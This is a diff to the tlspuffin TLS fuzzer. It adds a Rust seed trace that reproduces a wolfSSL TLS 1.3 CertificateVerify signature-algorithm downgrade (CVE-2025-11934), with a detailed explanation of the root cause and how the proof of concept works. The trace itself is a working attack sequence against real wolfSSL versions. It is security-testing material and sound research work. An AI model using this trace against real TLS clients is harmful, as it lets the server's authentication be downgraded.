@@ -1545,6 +1545,241 @@ pub fn seed_cve_2024_5814(client: AgentName) -> Trace<TLSProtocolTypes> {
     }
 }
 
+/// <https://nvd.nist.gov/vuln/detail/CVE-2025-11934>
+///
+/// Root cause: `DoTls13CertificateVerify()` (wolfSSL `src/tls13.c`) decodes the attacker-
+/// controlled `(hash, signature)` algorithm identifier from the received `CertificateVerify`
+/// message and only checks that the receiver holds a key of the matching *family* (e.g. "do I
+/// have any ECC key"), via `ssl->peerEccDsaKey != NULL`. It never checks that the specific
+/// `(hash, signature)` pair is actually a member of the list the receiver advertised in its own
+/// `signature_algorithms` extension (`ssl->suites->hashSigAlgo` / `ssl->options.hashSigAlgo`).
+/// This allows a peer to authenticate using a signature algorithm that was never offered/accepted,
+/// as long as it possesses a key of the right family - a downgrade / improper input validation
+/// bug (CWE-347 / CWE-20), not a memory-safety bug.
+///
+/// Reachability: `DoTls13CertificateVerify` is invoked by the TLS 1.3 client when verifying the
+/// server's `CertificateVerify` during an ordinary, fully server-authenticated full handshake -
+/// no session resumption, renegotiation or client authentication is required. The vulnerable
+/// field is the 2-byte signature-algorithm identifier directly inside the `CertificateVerify`
+/// handshake message, which is already part of tlspuffin's term/trace DAG (`fn_certificate_verify`
+/// / `SignatureScheme`), so it is fully within the DY attacker's reach and within puffin's
+/// mutation search space in principle. In practice, triggering it requires correlating the
+/// client's own `signature_algorithms` extension content with an independently-chosen algorithm
+/// in a later, attacker-crafted `CertificateVerify` - exactly the kind of cross-message
+/// correlation undirected mutation struggles to stumble on, hence this directed seed.
+///
+/// PoC strategy: the client under test is configured to offer *only* `RSA-PSS+SHA256` in its
+/// `signature_algorithms` extension (`sigalgs` PUT config), so it never declares willingness to
+/// accept any ECDSA signature. Server authentication is disabled (`server_authentication: false`,
+/// i.e. `SSL_VERIFY_NONE`) purely so an untrusted, self-signed EC certificate can be used as the
+/// leaf without needing a CA relationship - this does not affect `CertificateVerify` processing,
+/// which is a mandatory protocol step independent of chain-of-trust verification. The attacker
+/// (acting as the fully symbolic "server" role) sends that EC certificate plus a genuinely valid
+/// ECDSA P-256/SHA-256 `CertificateVerify` (it holds the matching private key), i.e. an algorithm
+/// never offered by the client. On vulnerable wolfSSL 5.8.2/5.8.3 the handshake completes anyway.
+pub fn seed_cve_2025_11934(client: AgentName) -> Trace<TLSProtocolTypes> {
+    let curve = term! {
+        fn_get_any_client_curve(
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))])
+        )
+    };
+
+    let server_hello = term! {
+          fn_server_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]),
+            fn_cipher_suite13_aes_128_gcm_sha256,
+            fn_compression,
+            (fn_server_extensions_make(
+              (fn_server_extensions_append(
+                  (fn_server_extensions_append(
+                      fn_server_extensions_new,
+                      (fn_key_share_server_extension(
+                          (fn_key_share_deterministic((@curve)))
+                      ))
+                  )),
+                  fn_supported_versions13_server_extension
+            ))))
+        )
+    };
+
+    let server_hello_transcript = term! {
+        fn_append_transcript(
+            (fn_append_transcript(
+                fn_new_transcript,
+                ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]) // ClientHello
+            )),
+            (@server_hello) // plaintext ServerHello
+        )
+    };
+
+    let encrypted_extensions = term! {
+        fn_encrypted_extensions(
+            fn_server_extensions_new
+        )
+    };
+
+    let encrypted_extensions_transcript = term! {
+        fn_append_transcript(
+            (@server_hello_transcript),
+            (@encrypted_extensions) // plaintext EncryptedExtensions
+        )
+    };
+
+    // Leaf certificate carries an ECDSA (P-256) key. It is untrusted/self-signed, which is fine
+    // since `server_authentication: false` below disables chain-of-trust verification - we are
+    // only exercising CertificateVerify signature-algorithm validation, not PKI validation.
+    let certificate = term! {
+        fn_certificate13(
+            (fn_payload_u8((fn_empty_bytes_vec))),
+            (fn_certificate_entries_make(
+                (fn_chain_append_certificate_entry(
+                  fn_empty_certificate_chain,
+                  (fn_certificate_entry_extensions(
+                    fn_random_ec_cert,
+                    (fn_cert_extensions_make(
+                        fn_cert_extensions_new
+                    ))
+            ))))
+            ))
+        )
+    };
+
+    let certificate_transcript = term! {
+        fn_append_transcript(
+            (@encrypted_extensions_transcript),
+            (@certificate) // plaintext Certificate
+        )
+    };
+
+    // Genuinely signed with the EC private key under ECDSA_NISTP256_SHA256 - an algorithm the
+    // client never offered (its `signature_algorithms` extension only lists RSA-PSS+SHA256).
+    let certificate_verify = term! {
+        fn_certificate_verify(
+            fn_ecdsa_signature_algorithm,
+            (fn_payload_u16(
+                (fn_ecdsa_sign_server(
+                    (@certificate_transcript),
+                    fn_random_ec_key
+                ))
+            ))
+        )
+    };
+
+    let certificate_verify_transcript = term! {
+        fn_append_transcript(
+            (@certificate_transcript),
+            (@certificate_verify) // plaintext CertificateVerify
+        )
+    };
+
+    let server_finished = term! {
+        fn_finished(
+            (fn_verify_data_server(
+                (@certificate_verify_transcript),
+                (@server_hello_transcript),
+                (fn_get_client_key_share(((client, 0)), (@curve))),
+                (@curve),
+                fn_no_psk,
+                fn_new_random,
+                fn_cipher_suite13_aes_128_gcm_sha256
+            ))
+        )
+    };
+
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![AgentDescriptor::from_config(
+            client,
+            TLSDescriptorConfig {
+                tls_version: TLSVersion::V1_3,
+                typ: AgentType::Client,
+                server_authentication: false,
+                sigalgs: Some("RSA-PSS+SHA256".to_string()),
+                ..TLSDescriptorConfig::default()
+            },
+        )],
+        steps: vec![
+            OutputAction::new_step(client),
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { server_hello
+                }),
+            },
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt_handshake(
+                            (@encrypted_extensions),
+                            (@server_hello_transcript),
+                            (fn_get_client_key_share(((client, 0)), (@curve))),
+                            fn_no_psk,
+                            (@curve),
+                            fn_false,
+                            fn_seq_0,  // sequence 0
+                            fn_new_random,
+                            fn_cipher_suite13_aes_128_gcm_sha256
+                        )
+                    }
+                }),
+            },
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt_handshake(
+                            (@certificate),
+                            (@server_hello_transcript),
+                            (fn_get_client_key_share(((client, 0)), (@curve))),
+                            fn_no_psk,
+                            (@curve),
+                            fn_false,
+                            fn_seq_1,  // sequence 1
+                            fn_new_random,
+                            fn_cipher_suite13_aes_128_gcm_sha256
+                        )
+                    }
+                }),
+            },
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt_handshake(
+                            (@certificate_verify),
+                            (@server_hello_transcript),
+                            (fn_get_client_key_share(((client, 0)), (@curve))),
+                            fn_no_psk,
+                            (@curve),
+                            fn_false,
+                            fn_seq_2,  // sequence 2
+                            fn_new_random,
+                            fn_cipher_suite13_aes_128_gcm_sha256
+                        )
+                    }
+                }),
+            },
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt_handshake(
+                            (@server_finished),
+                            (@server_hello_transcript),
+                            (fn_get_client_key_share(((client, 0)), (@curve))),
+                            fn_no_psk,
+                            (@curve),
+                            fn_false,
+                            fn_seq_3,  // sequence 3
+                            fn_new_random,
+                            fn_cipher_suite13_aes_128_gcm_sha256
+                        )
+                    }
+                }),
+            },
+        ],
+        ..Default::default()
+    }
+}
+
 #[cfg(test)]
 pub mod tests {
     use puffin::algebra::TermType;
